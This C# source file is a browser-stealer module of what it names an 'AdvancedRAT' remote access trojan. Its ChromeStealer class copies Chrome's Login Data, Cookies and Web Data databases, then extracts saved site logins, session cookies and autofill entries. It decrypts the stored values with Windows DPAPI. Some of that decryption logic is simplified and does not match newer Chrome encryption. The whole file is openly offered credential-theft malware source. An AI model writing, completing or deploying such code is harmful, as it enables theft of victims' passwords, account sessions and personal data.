using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Data.SQLite;
using System.Collections.Generic;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Diagnostics;

namespace AdvancedRAT.Stealers.BrowserStealer
{
    public class ChromeStealer
    {
        public static async Task<List<Credentials>> StealChromeCredentials()
        {
            return await Task.Run(() =>
            {
                List<Credentials> credentialsList = new List<Credentials>();
                
                try
                {
                    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string chromePath = Path.Combine(localAppData, @"Google\Chrome\User Data\Default\Login Data");
                    
                    if (!File.Exists(chromePath))
                    {
                        Console.WriteLine("Chrome Login Data not found");
                        return credentialsList;
                    }
                    
                    // Copy the database to avoid locking issues
                    string tempPath = Path.GetTempFileName();
                    File.Copy(chromePath, tempPath, true);
                    
                    try
                    {
                        using (var connection = new SQLiteConnection($"Data Source={tempPath};Version=3;"))
                        {
                            connection.Open();
                            
                            string query = "SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC";
                            using (var command = new SQLiteCommand(query, connection))
                            {
                                using (var reader = command.ExecuteReader())
                                {
                                    while (reader.Read())
                                    {
                                        string url = reader.GetString(0);
                                        string username = reader.GetString(1);
                                        byte[] encryptedPassword = (byte[])reader.GetValue(2);
                                        
                                        string decryptedPassword = DecryptChromePassword(encryptedPassword);
                                        
                                        if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(decryptedPassword))
                                        {
                                            credentialsList.Add(new Credentials
                                            {
                                                URL = url,
                                                Username = username,
                                                Password = decryptedPassword
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                    finally
                    {
                        File.Delete(tempPath);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Chrome credentials: {ex.Message}");
                }
                
                return credentialsList;
            });
        }
        
        public static async Task<List<Cookie>> StealChromeCookies()
        {
            return await Task.Run(() =>
            {
                List<Cookie> cookiesList = new List<Cookie>();
                
                try
                {
                    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string chromePath = Path.Combine(localAppData, @"Google\Chrome\User Data\Default\Cookies");
                    
                    if (!File.Exists(chromePath))
                    {
                        Console.WriteLine("Chrome Cookies not found");
                        return cookiesList;
                    }
                    
                    // Copy the database to avoid locking issues
                    string tempPath = Path.GetTempFileName();
                    File.Copy(chromePath, tempPath, true);
                    
                    try
                    {
                        using (var connection = new SQLiteConnection($"Data Source={tempPath};Version=3;"))
                        {
                            connection.Open();
                            
                            string query = "SELECT host_key, name, path, encrypted_value FROM cookies";
                            using (var command = new SQLiteCommand(query, connection))
                            {
                                using (var reader = command.ExecuteReader())
                                {
                                    while (reader.Read())
                                    {
                                        string host = reader.GetString(0);
                                        string name = reader.GetString(1);
                                        string path = reader.GetString(2);
                                        byte[] encryptedValue = (byte[])reader.GetValue(3);
                                        
                                        string decryptedValue = DecryptChromePassword(encryptedValue);
                                        
                                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(name))
                                        {
                                            cookiesList.Add(new Cookie
                                            {
                                                Host = host,
                                                Name = name,
                                                Path = path,
                                                Value = decryptedValue
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                    finally
                    {
                        File.Delete(tempPath);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Chrome cookies: {ex.Message}");
                }
                
                return cookiesList;
            });
        }
        
        public static async Task<List<AutofillData>> StealChromeAutofill()
        {
            return await Task.Run(() =>
            {
                List<AutofillData> autofillList = new List<AutofillData>();
                
                try
                {
                    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string chromePath = Path.Combine(localAppData, @"Google\Chrome\User Data\Default\Web Data");
                    
                    if (!File.Exists(chromePath))
                    {
                        Console.WriteLine("Chrome Web Data not found");
                        return autofillList;
                    }
                    
                    // Copy the database to avoid locking issues
                    string tempPath = Path.GetTempFileName();
                    File.Copy(chromePath, tempPath, true);
                    
                    try
                    {
                        using (var connection = new SQLiteConnection($"Data Source={tempPath};Version=3;"))
                        {
                            connection.Open();
                            
                            string query = "SELECT name, value FROM autofill";
                            using (var command = new SQLiteCommand(query, connection))
                            {
                                using (var reader = command.ExecuteReader())
                                {
                                    while (reader.Read())
                                    {
                                        string name = reader.GetString(0);
                                        string value = reader.GetString(1);
                                        
                                        if (!string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(value))
                                        {
                                            autofillList.Add(new AutofillData
                                            {
                                                Name = name,
                                                Value = value
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                    finally
                    {
                        File.Delete(tempPath);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Chrome autofill: {ex.Message}");
                }
                
                return autofillList;
            });
        }
        
        private static string DecryptChromePassword(byte[] encryptedData)
        {
            try
            {
                // Check if the data starts with "v10" or "v11" - Chrome's newer encryption
                if (encryptedData.Length >= 3 && 
                   (Encoding.ASCII.GetString(encryptedData, 0, 3) == "v10" || 
                    Encoding.ASCII.GetString(encryptedData, 0, 3) == "v11"))
                {
                    // For v10/v11, we'd need to use DPAPI with additional entropy
                    // This is a simplified version - in practice, Chrome uses OS-level encryption
                    try
                    {
                        // Skip the "v10" or "v11" prefix (3 bytes) and decrypt using DPAPI
                        byte[] encryptedPassword = new byte[encryptedData.Length - 3];
                        Array.Copy(encryptedData, 3, encryptedPassword, 0, encryptedPassword.Length);
                        
                        return Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        // If DPAPI fails, return empty string
                        return "";
                    }
                }
                else
                {
                    // Older versions of Chrome used DPAPI directly
                    return Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to decrypt Chrome password: {ex.Message}");
                return "";
            }
        }
        
        public static async Task<string> GetChromeVersion()
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string chromeExePath = Path.Combine(localAppData, @"Google\Chrome\Application\chrome.exe");
                
                if (File.Exists(chromeExePath))
                {
                    FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(chromeExePath);
                    return versionInfo.FileVersion;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error getting Chrome version: {ex.Message}");
            }
            
            return "Not installed or inaccessible";
        }
    }
    
    public class Credentials
    {
        public string URL { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
    }
    
    public class Cookie
    {
        public string Host { get; set; }
        public string Name { get; set; }
        public string Path { get; set; }
        public string Value { get; set; }
    }
    
    public class AutofillData
    {
        public string Name { get; set; }
        public string Value { get; set; }
    }
}